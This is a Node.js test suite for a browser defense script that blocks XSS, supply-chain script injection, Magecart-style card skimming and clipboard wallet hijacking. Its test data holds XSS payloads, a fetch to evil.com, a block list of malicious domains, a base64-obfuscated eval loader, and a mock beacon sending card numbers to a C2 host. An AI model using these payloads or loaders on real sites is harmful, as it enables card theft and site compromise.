const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('node:fs');
const path = require('node:path');

function createGeDefenseSandbox() {
  const logs = [];
  const fakeConsole = {
    log: (...args) => logs.push(args.join(' ')),
    error: (...args) => logs.push('ERROR: ' + args.join(' ')),
    warn: (...args) => logs.push('WARN: ' + args.join(' '))
  };

  class FakeNode {
    constructor(name = 'div') {
      this.nodeName = name.toUpperCase();
      this.attributes = [];
      this.parentNode = null;
    }
    removeAttribute(name) {
      this.attributes = this.attributes.filter(a => a.name.toLowerCase() !== name.toLowerCase());
    }
    setAttribute(name, value) {
      const existing = this.attributes.find(a => a.name.toLowerCase() === name.toLowerCase());
      if (existing) {
        existing.value = String(value);
      } else {
        this.attributes.push({ name, value: String(value) });
      }
    }
    remove() {
      if (this.parentNode && this.parentNode.childNodes) {
        this.parentNode.childNodes = this.parentNode.childNodes.filter(c => c !== this);
      }
    }
    getAttribute(name) {
      const existing = this.attributes.find(a => a.name.toLowerCase() === name.toLowerCase());
      return existing ? existing.value : null;
    }
    appendChild(child) {
      child.parentNode = this;
      this.childNodes = this.childNodes || [];
      this.childNodes.push(child);
      return child;
    }
    insertBefore(newNode, refNode) {
      newNode.parentNode = this;
      this.childNodes = this.childNodes || [];
      this.childNodes.push(newNode);
      return newNode;
    }
  }

  function parseMockNodes(html, parent) {
    const nodes = [];
    if (/<script/i.test(html)) {
      const n = new FakeNode('script');
      n.parentNode = parent;
      nodes.push(n);
    }
    if (/<iframe/i.test(html)) {
      const n = new FakeNode('iframe');
      n.parentNode = parent;
      nodes.push(n);
    }
    if (/<img/i.test(html)) {
      const n = new FakeNode('img');
      n.parentNode = parent;
      n.attributes.push({ name: 'src', value: 'missing.jpg' });
      if (/onerror=/i.test(html)) n.attributes.push({ name: 'onerror', value: 'alert(1)' });
      if (/src="javascript:/i.test(html)) n.attributes.find(a => a.name === 'src').value = 'javascript:alert(1)';
      if (/src="\/\/attacker/i.test(html)) n.attributes.find(a => a.name === 'src').value = '//attacker.com/evil.js';
      nodes.push(n);
    }
    if (/<a/i.test(html)) {
      const n = new FakeNode('a');
      n.parentNode = parent;
      if (/onclick=/i.test(html)) n.attributes.push({ name: 'onclick', value: 'leak()' });
      if (/href="javascript:/i.test(html)) n.attributes.push({ name: 'href', value: 'javascript:alert(1)' });
      nodes.push(n);
    }
    return nodes;
  }

  class FakeElement extends FakeNode {
    constructor(tag = 'div') {
      super(tag);
      this.content = { childNodes: [] };
      this._raw = '';
    }
    getBoundingClientRect() {
      return { x: 10, y: 20, width: 200, height: 100, top: 20, right: 210, bottom: 120, left: 10, toJSON: () => ({}) };
    }
    insertAdjacentHTML(position, text) {
      this.innerHTML += text;
    }
  }

  Object.defineProperty(FakeElement.prototype, 'innerHTML', {
    get: function() {
      if (this.content && this.content.childNodes) {
        return this.content.childNodes.map(n => {
          const tag = n.nodeName.toLowerCase();
          const attrs = n.attributes.map(a => `${a.name}="${a.value}"`).join(' ');
          return `<${tag}${attrs ? ' ' + attrs : ''}></${tag}>`;
        }).join('');
      }
      return this._raw;
    },
    set: function(val) {
      this._raw = String(val);
      if (this.content) {
        this.content.childNodes = parseMockNodes(this._raw, this.content);
      }
    },
    configurable: true,
    enumerable: true
  });

  Object.defineProperty(FakeElement.prototype, 'outerHTML', {
    get: function() { return this.innerHTML; },
    set: function(val) { this.innerHTML = val; },
    configurable: true,
    enumerable: true
  });

  class FakeTemplate extends FakeElement {
    constructor() {
      super('template');
    }
  }

  const fakeDocument = {
    head: new FakeElement('head'),
    documentElement: new FakeElement('html'),
    createElement(tag) {
      if (tag.toLowerCase() === 'template') return new FakeTemplate();
      return new FakeElement(tag);
    },
    createTreeWalker(root) {
      let idx = 0;
      const list = (root && root.childNodes) ? root.childNodes.slice() : [];
      return {
        nextNode: () => {
          if (idx < list.length) return list[idx++];
          return null;
        }
      };
    },
    querySelector: () => null,
    addEventListener: () => {},
    dispatchEvent: () => {}
  };

  let lastBeaconSent = null;
  let lastClipboardText = null;
  let currentSelectionText = '';

  const fakeWindow = {
    location: { hostname: 'example.com', href: 'https://example.com/', search: '' },
    navigator: {
      userAgent: 'Mozilla/5.0',
      sendBeacon(url, data) {
        lastBeaconSent = { url, data };
        return true;
      },
      clipboard: {
        async writeText(t) {
          lastClipboardText = t;
        }
      }
    },
    getSelection() {
      return { toString: () => currentSelectionText };
    },
    sessionStorage: {
      getItem: () => null,
      setItem: () => {},
      removeItem: () => {}
    },
    Element: FakeElement,
    Node: FakeNode,
    document: fakeDocument
  };

  const ctx = {
    window: fakeWindow,
    document: fakeDocument,
    console: fakeConsole,
    Element: FakeElement,
    Node: FakeNode,
    URL,
    Math,
    Object,
    String,
    Uint8ClampedArray
  };
  ctx.globalThis = ctx;

  const context = vm.createContext(ctx);
  const engineSource = fs.readFileSync(path.join(__dirname, '../shared/aegis-engine.js'), 'utf-8');
  vm.runInContext(engineSource, context);

  return {
    context,
    logs,
    FakeElement,
    fakeDocument,
    fakeWindow,
    getLastBeaconSent: () => lastBeaconSent,
    getLastClipboardText: () => lastClipboardText,
    setSelectionText: (t) => { currentSelectionText = t; }
  };
}

test('GeDefense Light: Self-XSS console defense displays warning', () => {
  const { logs } = createGeDefenseSandbox();
  const joined = logs.join(' ');
  assert.ok(joined.includes('VisionGaiaTechnology'), 'Should output VGT branding banner');
  assert.ok(joined.includes('HALT!') || joined.includes('STOP!'), 'Should output HALT / STOP warning');
  assert.ok(joined.includes('Self-XSS'), 'Should explain Self-XSS scam risk');
});

test('GeDefense Light: Cognitive Fast-Path engine returns clean HTML without parsing overhead', () => {
  const { context } = createGeDefenseSandbox();
  const cleanInput = '<div class="glass-card"><span class="title">Safe Content</span></div>';
  const sanitized = context.window.__AEGIS_OMEGA__.sanitizeHTML(cleanInput);
  assert.equal(sanitized, cleanInput, 'Clean content should pass immediately untouched');
});

test('GeDefense Light: Neutralizes dangerous script and iframe tags in innerHTML', () => {
  const { context } = createGeDefenseSandbox();
  const dirtyInput = '<div>Safe</div><script>fetch("evil.com")</script>';
  const sanitized = context.window.__AEGIS_OMEGA__.sanitizeHTML(dirtyInput);
  assert.ok(!sanitized.includes('<script'), 'Script tag should be stripped');
});

test('GeDefense Light: Strips inline event handlers (onerror, onclick)', () => {
  const { context } = createGeDefenseSandbox();
  const dirtyInput = '<img src="missing.jpg" onerror="alert(1)">';
  const sanitized = context.window.__AEGIS_OMEGA__.sanitizeHTML(dirtyInput);
  assert.ok(!sanitized.includes('onerror'), 'Inline onerror handler must be stripped');
});

test('GeDefense Light: Neutralizes javascript: protocol execution in URLs', () => {
  const { context } = createGeDefenseSandbox();
  const dirtyInput = '<a href="javascript:alert(1)">Click here</a>';
  const sanitized = context.window.__AEGIS_OMEGA__.sanitizeHTML(dirtyInput);
  assert.ok(sanitized.includes('#vgt-blocked-protocol'), 'javascript: URI must be replaced with #vgt-blocked-protocol');
});

test('GeDefense Light: Element.prototype.setAttribute intercepts javascript: URI injection', () => {
  const { context } = createGeDefenseSandbox();
  const el = new context.Element('a');
  el.setAttribute('href', 'javascript:exploit()');
  const attr = el.attributes.find(a => a.name === 'href');
  assert.equal(attr.value, '#vgt-blocked-protocol', 'setAttribute must neutralize javascript: URI');
});

test('GeDefense Light: Can be disabled via config toggle', () => {
  const { context } = createGeDefenseSandbox();
  context.window.__AEGIS_OMEGA__.setConfig({ GEDEFENSE_LIGHT: false });
  assert.equal(context.window.__AEGIS_OMEGA__.getConfig().GEDEFENSE_LIGHT, false);
});

test('GeDefense Light: Blocks Optimizely supply-chain loader & iOS exploit kit dynamic <script>/<iframe> injections', () => {
  const { context, fakeDocument } = createGeDefenseSandbox();
  const aegis = context.window.__AEGIS_OMEGA__;

  // 1. Direct URL classification check
  assert.equal(aegis.isMaliciousResourceUrl('https://1688360.cc/track.js', 'script'), true, 'Must block 1688360.cc skimmer loader');
  assert.equal(aegis.isMaliciousResourceUrl('https://webshell.lol/get.js', 'script'), true, 'Must block webshell.lol loader');
  assert.equal(aegis.isMaliciousResourceUrl('https://5vobauua3ojpklx.icu/B9/index.html', 'iframe'), true, 'Must block Coruna/DarkSword .icu iOS exploit kit');
  assert.equal(aegis.isMaliciousResourceUrl('https://example.com/static/app.js', 'script'), false, 'Same-origin script must be allowed');
  assert.equal(aegis.isMaliciousResourceUrl('https://js.stripe.com/v3/', 'script'), false, 'Legitimate payment provider script must be allowed');

  // 2. setAttribute interception on <script> and <iframe>
  const scriptEl = fakeDocument.createElement('script');
  scriptEl.setAttribute('src', 'https://1688360.cc/track.js');
  assert.match(scriptEl.getAttribute('src'), /^about:blank#vgt-blocked-supply-chain/, 'Malicious script src via setAttribute must be neutralized');

  // 3. appendChild interception for inline Optimizely eval fallback loader
  const inlineScript = fakeDocument.createElement('script');
  inlineScript.textContent = 'window._k7 = true; eval(atob("aHR0cHM6Ly8xNjg4MzYwLmNjL3RyYWNrLmpz"));';
  fakeDocument.head.appendChild(inlineScript);
  assert.equal(inlineScript.textContent, '/* blocked by GeDefense Light */', 'Inline Optimizely C2 payload must be neutralized before DOM insertion');
});

test('GeDefense Light: Anti-Magecart sendBeacon Guard blocks card exfiltration to C2 endpoints', () => {
  const { fakeWindow, getLastBeaconSent } = createGeDefenseSandbox();

  // Attempt Magecart card exfiltration via sendBeacon to 1688360.cc/card.php
  const res = fakeWindow.navigator.sendBeacon('https://1688360.cc/card.php', JSON.stringify({ cc: '4111222233334444', cvv: '123' }));
  assert.equal(res, true, 'Defended sendBeacon returns true while dropping malicious exfiltration');
  assert.equal(getLastBeaconSent(), null, 'Underlying sendBeacon must NOT transmit card data to C2');

  // Legitimate same-origin beacon is permitted
  fakeWindow.navigator.sendBeacon('https://example.com/api/keepalive', 'ok');
  assert.ok(getLastBeaconSent(), 'Same-origin non-tracker beacon must be permitted');
  assert.equal(getLastBeaconSent().url, 'https://example.com/api/keepalive');
});

test('GeDefense Light: Crypto-Clipper Guard prevents silent wallet address replacement in clipboard', async () => {
  const { fakeWindow, getLastClipboardText, setSelectionText } = createGeDefenseSandbox();

  const userSelectedWallet = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
  const attackerWallet = '0xDeadBeefDeadBeefDeadBeefDeadBeefDeadBeef';

  // User selects their legitimate ETH address on the page, but clipper script tries to write attacker wallet
  setSelectionText(userSelectedWallet);
  await fakeWindow.navigator.clipboard.writeText(attackerWallet);

  assert.equal(getLastClipboardText(), userSelectedWallet, 'Clipboard must retain the user-selected wallet address instead of attacker clipper address');
});

